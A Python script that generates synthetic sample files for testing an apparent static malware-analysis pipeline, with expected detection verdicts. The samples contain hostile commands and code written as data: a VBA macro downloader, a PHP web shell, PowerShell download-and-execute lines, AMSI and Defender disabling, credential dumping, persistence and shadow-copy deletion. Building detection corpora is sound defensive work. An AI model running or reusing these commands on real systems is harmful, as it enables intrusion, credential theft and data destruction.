"""Generate the demo sample files used for the Milestone 1 walkthrough.

Every sample here is a SYNTHETIC detection-test artifact. None is live malware,
none contains a runnable payload, and none contains the EICAR string, so local
antivirus will not quarantine them. The embedded URLs/IPs are inert indicator
strings for the extractor to find; nothing connects anywhere. Their only
purpose is to exercise the static analysis pipeline end to end.

Run:  python demo/generate_samples.py
"""

import random
from pathlib import Path

OUT = Path(__file__).parent / 'samples'
OUT.mkdir(exist_ok=True)

BANNER = (
    b'; ThreatLens static-analysis TEST CORPUS - synthetic sample, not live malware.\n'
    b'; No runnable payload. Hosts are RFC 5737 / .test values. Do not weaponize.\n\n'
)


def write(name: str, data: bytes) -> None:
    (OUT / name).write_bytes(data)
    print(f'  {name:30} {len(data):>7} bytes')


print('Writing demo samples to', OUT, '\n')

# 1. Clean file --------------------------------------------------------------
write(
    'clean_notes.txt',
    b'Project meeting notes\n\n- Review Q3 roadmap\n- Assign frontend tasks\n'
    b'- Book the demo room for Friday\n- Follow up with the design team\n',
)

# 2. Office macro dropper ---------------------------------------------------
write(
    'invoice_macro.doc.txt',
    b'Attribute VB_Name = "ThisDocument"\n\n'
    b'Sub AutoOpen()\n'
    b'  Dim sh As Object\n'
    b'  Set sh = CreateObject("WScript.Shell")\n'
    b'  Dim x As Object\n'
    b'  Set x = CreateObject("MSXML2.XMLHTTP")\n'
    b"  x.Open \"GET\", \"http://45.147.230.112/inv/stage1.dat\", False\n"
    b'  x.Send\n'
    b'  Dim s As Object\n'
    b'  Set s = CreateObject("ADODB.Stream")\n'
    b"  sh.Run \"powershell -nop -w hidden -ep bypass -enc SQBFAFgAKAApAA==\", 0, False\n"
    b'End Sub\n',
)

# 3. Extension disguise ---------------------------------------------------
write(
    'invoice_2026.pdf.exe',
    b'This looks like a document but the name claims to be an executable.\n'
    b'rundll32.exe shell32.dll,Control_RunDLL\n'
    b'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d payload\n'
    b'schtasks /create /sc onlogon /tn Updater /tr payload.exe\n',
)

# 4. Packed / high-entropy binary with an MZ header ---------------------
rng = random.Random(1337)
write('packed_blob.bin', b'MZ' + bytes(rng.randrange(256) for _ in range(8192)))

# 5. Process-injection API strings -------------------------------------
write(
    'injector_strings.txt',
    b'imports:\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n'
    b'NtUnmapViewOfSection\nSetThreadContext\nQueueUserAPC\nRtlCreateUserThread\n',
)

# 6. Ransom note -------------------------------------------------------
write(
    'README_TO_DECRYPT.txt',
    b'!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n'
    b'Your documents, photos and databases are no longer accessible.\n'
    b'To recover them you must pay the ransom in bitcoin.\n'
    b'Send 0.15 BTC to the wallet below, then contact us via our .onion site.\n'
    b'BTC wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n'
    b'Every file was renamed with the .locked extension.\n'
    b'Do not run vssadmin delete shadows - it is already done.\n',
)

# 7. PHP web shell ---------------------------------------------------
write(
    'upload.php',
    b'<?php\n'
    b"// synthetic web shell test artifact\n"
    b"if (isset($_REQUEST['c'])) { eval(base64_decode($_REQUEST['c'])); }\n"
    b"system($_GET['cmd']);\n"
    b'?>\n',
)

# 8. Full trojan-downloader "sample" ---------------------------------
_b64_blob = (
    'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA'
    + ''.join(rng.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')
             for _ in range(900))
)
write(
    'trojan_downloader.bin',
    BANNER
    + b'== extracted strings ==\n'
    + b'powershell -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA\n'
    + b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/stage2.ps1')\n"
    + b"(New-Object Net.WebClient).DownloadFile('http://185.220.101.45/gate.php','%TEMP%\\svchost.exe')\n"
    + b'certutil -urlcache -split -f http://91.219.237.244/payload.dat payload.dat\n'
    + b'bitsadmin /transfer j http://91.219.237.244/p.exe %TEMP%\\p.exe\n'
    + b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
    + b'AmsiScanBuffer\namsiInitFailed\nAmsiUtils\n'
    + b'Set-MpPreference -DisableRealtimeMonitoring $true\n'
    + b'netsh advfirewall set allprofiles state off\n'
    + b'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "%TEMP%\\svchost.exe" /f\n'
    + b'schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "%TEMP%\\svchost.exe" /rl highest /f\n'
    + b'VirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nNtUnmapViewOfSection\nQueueUserAPC\n'
    + b'sekurlsa::logonpasswords\nlsass.exe\nMiniDumpWriteDump\n'
    + b'C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n'
    + b'vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n'
    + b'== network ==\n'
    + b'X-Malware-C2: http://45.147.230.112/gate.php\n'
    + b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko\n'
    + b'sleep=60000\nc2: http://185.220.101.45/panel/\n'
    + b'== embedded blob (base64, random - harmless) ==\n'
    + _b64_blob.encode()
    + b'\n',
)

print(
    '\nExpected verdicts:\n'
    '  clean_notes.txt          LOW     Likely Benign\n'
    '  injector_strings.txt     MEDIUM  YARA: process injection\n'
    '  invoice_2026.pdf.exe     MEDIUM  extension mismatch + LOLBins\n'
    '  packed_blob.bin          MEDIUM  high entropy / packed\n'
    '  upload.php               HIGH    YARA: web shell\n'
    '  README_TO_DECRYPT.txt    HIGH    YARA: ransomware note\n'
    '  invoice_macro.doc.txt    HIGH    YARA: Office macro dropper\n'
    '  trojan_downloader.bin    HIGH    Known Trojan (signature) + ~10 YARA rules\n'
)
